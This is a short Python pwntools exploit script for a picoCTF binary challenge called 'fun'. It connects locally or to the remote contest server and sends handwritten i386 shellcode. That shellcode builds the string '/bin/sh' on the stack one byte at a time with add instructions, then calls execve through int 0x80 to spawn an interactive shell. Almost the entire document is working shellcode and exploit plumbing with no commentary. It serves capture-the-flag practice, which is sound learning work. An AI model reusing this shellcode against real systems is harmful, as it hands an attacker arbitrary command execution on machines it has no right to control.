#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 16610
HOST = "mercury.picoctf.net"
exe = context.binary = ELF('./fun', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

shellcode = asm('''
   xor eax, eax
   push eax                         
   push eax               
   mov edi, esp 

   mov al, 0x2f                    
   add [edi], al                                              
   inc edi                          
   nop                              

   mov al, 0x62                     
   add [edi], al
   inc edi
   nop

   mov al, 0x69                    
   add [edi], al
   inc edi
   nop

   mov al, 0x6e                     
   add [edi], al
   inc edi
   nop

   mov al, 0x2f                     
   add [edi], al
   inc edi
   nop

   mov al, 0x73                     
   add [edi], al
   inc edi
   nop

   mov al, 0x68                     
   add [edi], al
   inc edi
   nop                      
                          
   mov ebx, esp
   xor ecx, ecx                      
   xor edx, edx 
   mov al, 0xb

   int 0x80
    ''', arch = 'i386')

p.sendafter(b"run:\n", shellcode)
p.interactive()

